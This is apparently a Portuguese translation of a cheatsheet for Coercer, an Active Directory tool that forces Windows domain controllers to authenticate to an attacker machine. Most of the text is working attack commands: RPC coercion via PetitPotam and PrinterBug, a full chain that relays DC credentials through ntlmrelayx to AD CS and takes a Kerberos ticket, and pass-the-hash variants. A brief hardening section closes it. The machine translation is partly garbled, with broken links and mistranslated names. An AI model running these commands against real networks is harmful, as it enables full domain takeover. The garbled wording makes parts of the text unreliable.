<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licença GPLv3">
</p>

<p alinhar="centro">
  <b>🌐 Verifica, detecta e força automaticamente servidores Windows e controladores de domínio a se autenticarem em máquinas arbitrárias por meio de mais de 12 protocolos RPC</b>
</p>

---

## 📋 Índice

- [Visão geral e o primitivo de coerção de autenticação] (#-overview--the-authentication-coercion-primitive)
- [Protocolos e métodos RPC suportados](#-supported-rpc-protocols--methods)
- [Instalação](#-instalação)
- [Verificação de interfaces RPC vulneráveis (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Executando coerção de autenticação (`coerce`)](#-executing-authentication-coercion-coerce)
- [A cadeia de ataque completa: Coerção -> Relé NTLM -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Filtragem de protocolo e método](#-protocolo--filtragem de método)
- [Suporte Kerberos e Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações Defensivas e Endurecimento](#-considerações defensivas--endurecimento)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e o primitivo de coerção de autenticação

Em ambientes do Active Directory, a **coerção de autenticação** é uma ofensiva primitiva devastadora. Ele explora interfaces RPC legadas implementadas em serviços do Windows que permitem que um usuário autenticado solicite a uma máquina remota (como um controlador de domínio) que se conecte a um caminho UNC designado (`\\attacker\share`).

Quando a máquina Windows remota se conecta à máquina controlada pelo invasor, ela inicia a **autenticação NTLM da conta da máquina** (`DC01$`). 

Ao capturar ou retransmitir esta credencial de conta de máquina usando `ntlmrelayx` para serviços de certificados do Active Directory (AD CS Web Enrollment - ESC8) ou alvos de delegação irrestrita, os invasores podem obter **comprometimento total e imediato do domínio**.

De autoria de **Clément Notin (p0dalirius)**, **Coercer** unifica mais de uma dúzia de explorações de coerção individuais (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) em uma estrutura única, automatizada e altamente modular.

---

## 🔌 Protocolos e métodos RPC suportados

Coercer testa e explora as seguintes interfaces RPC:

| Nome do protocolo | Nome comum da exploração | Tubo / Interface |
|---------------|---------------------|------------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug/SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare adjacente | Administração de impressão remota |
| **MS-SAMR** | Queijo | Gerente de contas de segurança |

---

## 📥 Instalação
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Verificação de interfaces RPC vulneráveis (`scan`)

Antes de acionar a coerção, verifique com segurança os controladores de domínio de destino para descobrir quais funções RPC estão habilitadas e acessíveis:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Executando coerção de autenticação (`coerce`)

Acione uma conexão NTLM de conta de máquina de saída do controlador de domínio de destino para seu ouvinte:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 A cadeia de ataque completa: Coerção -> Relé NTLM -> AD CS ESC8

O vetor canônico de escalonamento de domínio:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Filtragem de protocolo e método

Direcione um método específico sem enviar spam para todo o espectro de RPC:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Suporte Kerberos e Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Verificar DC em busca de coerção** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Autenticação forçada** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Coagir via MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Coagir via MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Coerção Pass-the-Hash** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Coerção de ingressos Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Considerações defensivas e endurecimento

1. **Desabilitar Spooler de Impressão em DCs:** O serviço Spooler de Impressão (`spoolsv.exe`) deve ser completamente desabilitado em Controladores de Domínio (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Ativar proteção estendida para autenticação (EPA):** Em servidores AD CS IIS, ative o EPA e exija HTTPS para bloquear ataques de retransmissão NTLM.
3. **Filtragem RPC e segmentação de rede:** Restrinja o acesso do mapeador de endpoint RPC (porta TCP 135) a sub-redes administrativas autorizadas.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O Coercer aciona chamadas de autenticação remota ativas que podem desestabilizar serviços de domínio não corrigidos. Use exclusivamente durante testes de penetração autorizados e com consentimento explícito do cliente.